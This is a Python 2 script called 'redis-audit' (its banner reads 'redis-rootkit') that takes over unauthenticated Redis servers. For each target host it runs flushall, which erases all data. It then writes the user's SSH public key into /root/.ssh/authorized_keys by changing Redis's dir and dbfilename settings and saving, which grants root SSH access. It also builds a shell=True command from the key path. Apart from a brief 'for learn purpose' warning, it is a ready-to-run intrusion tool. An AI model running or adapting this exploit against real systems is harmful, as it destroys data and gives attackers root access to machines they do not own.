import sys
import re
import redis
import getopt
import subprocess

host = '127.0.0.1'
port = 6379
rsa_pub = '~/.ssh/id_rsa.pub'

def usage():
	print 	"redis-audit 0.0.1"
	print 
	print 	"Usage: python redis-audit.py [OPTIONS] [HOSTNAME]"
	print 	"	<hostname>				Target hostname(default 127.0.0.1)"
	print 	"	-p --port <hostport>			Target port(default 6379)"
	print 	"	-r --rsa-pub <rsa_public_key>		Your rsa_public_key path."
	print 	"	-h --help 				Show redis-audit options."
	print
	print 	"Examples:"
	print	"	python redis-audit.py -r ~/.ssh/id_rsa.pub 127.0.0.1"
	print
	print 	"Warning: For learn popurse, use this at your own responsiblity."
	print
	sys.exit(0)

def handle_error(reason = "Oops, this host is pissed off, please try another."):
        """
	Handle error.
	"""
	print reason
        sys.exit(0)



def get_opt(args):
	""""
	Deal with command line arguments.
	"""
	global host
	global port
	global rsa_pub
	if not len(args):
		usage()
	try:
		opts, hosts = getopt.getopt(args, "p:hr:", ["help", "host=", "port=", "rsa-pub="])
	except getopt.GetoptError as err:
		print str(err)
		usage()

	for o, a in opts:
		if o in ("-h", "--help"):
			usage()
		elif o in ("-p", "--port"):
			port = a
		elif o in ("-r", "--rsa-pub"):
			rsa_pub = a

	return (hosts, port, rsa_pub)


def parse_rsa_pub(path=rsa_pub):
	"""
	Parse the rsa public key.
	"""
	return subprocess.check_output('echo "\n\n"; cat '+ path + '; echo "\n\n";', shell = True)	
	

def attack(target, port, rsa_pub):
	"""
	attack. 
	"""
	r = redis.StrictRedis(host=target, port=port)
	r.execute_command("flushall")
        if r.set("crackit", rsa_pub) is not True:
                print target + ": payload load failed, exit."
                return
        if r.config_set("dir", "/root/.ssh/") is not True:
                print target + ": redis config failed, exit."
               	return
       	if r.config_set("dbfilename", "authorized_keys") is not True:
                print target + ": authorized_keys writes failed, exit."
                return 
        if r.save() is not True:
                print target + ": authorized_keys save failed, exit."
        print "	" + target + ": attack succeeded!"



def main():
	"""
	redis-rootkit 0.0.1.
	"""
	
	hosts, port, rsa_pub = get_opt(sys.argv[1:])
	
	print	""" 

	########################################################
	
	redis-rootkit 0.0.1 
	
	########################################################

	"""
	rsa = parse_rsa_pub(rsa_pub)
	if re.search('ssh-rsa', rsa) is None:
		handle_error("Invalid rsa public key.")
		
	for host in hosts:
		attack(host, port, rsa)
	

if __name__ == '__main__':
	main()
	
